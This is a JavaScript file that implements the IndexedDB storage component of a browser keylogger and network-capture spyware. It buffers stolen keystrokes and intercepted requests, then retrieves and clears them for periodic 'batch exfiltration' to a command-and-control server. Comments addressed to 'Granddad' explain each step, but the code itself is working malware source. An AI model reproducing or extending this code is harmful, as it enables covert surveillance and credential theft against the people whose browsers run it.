// idb.js - A minimal, promise-based IndexedDB helper library.
// This script manages a local database in the browser to act as a resilient
// buffer for captured network requests and keystrokes. Data is stored here
// temporarily before being exfiltrated to the remote C2 server.

// NOTE FOR GRANDDAD: This script is like a secret storage locker inside your
// browser. The spy program uses it to hide all the information it steals (like
// your typed keys) before sending it to the bad guys. This makes sure that no
// data is lost.

const DB_NAME = 'netcapture-db';
const DB_VERSION = 2;
let dbPromise = null;

/**
 * Opens and initializes the IndexedDB database.
 * This function is memoized to avoid reopening the connection.
 * @returns {Promise<IDBDatabase>} A promise that resolves with the database instance.
 */
function openDB() {
    if (dbPromise) {
        return dbPromise;
    }

    dbPromise = new Promise((resolve, reject) => {
        const req = indexedDB.open(DB_NAME, DB_VERSION);

        req.onupgradeneeded = (ev) => {
            const db = ev.target.result;

            if (!db.objectStoreNames.contains('entries')) {
                db.createObjectStore('entries', { keyPath: 'id' });
            }

            if (!db.objectStoreNames.contains('keylogs')) {
                db.createObjectStore('keylogs', { autoIncrement: true });
            }
        };

        req.onsuccess = () => {
            resolve(req.result);
        };

        req.onerror = () => {
            reject(req.error);
        };
    });

    return dbPromise;
}

/**
 * Adds or updates a network request entry in the 'entries' object store.
 * @param {object} entry The network request object to save.
 * @returns {Promise<void>} A promise that resolves when the operation is complete.
 */
async function addEntry(entry) {
    const db = await openDB();
    return new Promise((resolve, reject) => {
        const tx = db.transaction('entries', 'readwrite');
        tx.objectStore('entries').put(entry);

        tx.oncomplete = () => {
            resolve();
        };

        tx.onerror = () => {
            reject(tx.error);
        };
    });
}

/**
 * Adds a new keystroke log to the 'keylogs' object store.
 * @param {object} log The keystroke log object to save.
 * @returns {Promise<void>} A promise that resolves when the operation is complete.
 */
// NOTE FOR GRANDDAD: Every time the keylogger script captures one of your
// keystrokes, this function is called to add that keystroke to the secret locker.
async function addKeyLog(log) {
    const db = await openDB();
    return new Promise((resolve, reject) => {
        const tx = db.transaction('keylogs', 'readwrite');
        tx.objectStore('keylogs').add(log);

        tx.oncomplete = () => {
            resolve();
        };

        tx.onerror = () => {
            reject(tx.error);
        };
    });
}

/**
 * Retrieves all keylogs from the database and then clears the store.
 * This is used for batch exfiltration.
 * @returns {Promise<Array<object>>} A promise that resolves with an array of all keylogs.
 */
// NOTE FOR GRANDDAD: Every 15 seconds, the "brain" comes here to take all the
// stolen keystrokes out of the locker to send them to the bad guys. After
// it copies them, it clears the locker so it's empty for next time.
async function getAndDeleteAllKeyLogs() {
    const db = await openDB();
    return new Promise((resolve, reject) => {
        const tx = db.transaction('keylogs', 'readwrite');
        const store = tx.objectStore('keylogs');
        const getAllReq = store.getAll();

        getAllReq.onsuccess = () => {
            const logs = getAllReq.result;
            // Only clear the store if there was data to retrieve
            if (logs && logs.length > 0) {
                store.clear();
            }

            // The transaction's oncomplete ensures the clear operation has finished
            tx.oncomplete = () => {
                resolve(logs || []); // Return an empty array if logs were null
            };
        };

        tx.onerror = () => {
            reject(tx.error);
        };
    });
}

/**
 * Retrieves all network entries from the database and then clears the store.
 * This is used for batch exfiltration.
 * @returns {Promise<Array<object>>} A promise that resolves with an array of all network entries.
 */
// NOTE FOR GRANDDAD: This does the same thing as the function above, but for
// the stolen network traffic data.
async function getAndDeleteAllEntries() {
    const db = await openDB();
    return new Promise((resolve, reject) => {
        const tx = db.transaction('entries', 'readwrite');
        const store = tx.objectStore('entries');
        const getAllReq = store.getAll();

        getAllReq.onsuccess = () => {
            const entries = getAllReq.result;
            // Only clear the store if there was data to retrieve
            if (entries && entries.length > 0) {
                store.clear();
            }

            // The transaction's oncomplete ensures the clear operation has finished
            tx.oncomplete = () => {
                resolve(entries || []); // Return an empty array if entries were null
            };
        };

        tx.onerror = () => {
            reject(tx.error);
        };
    });
}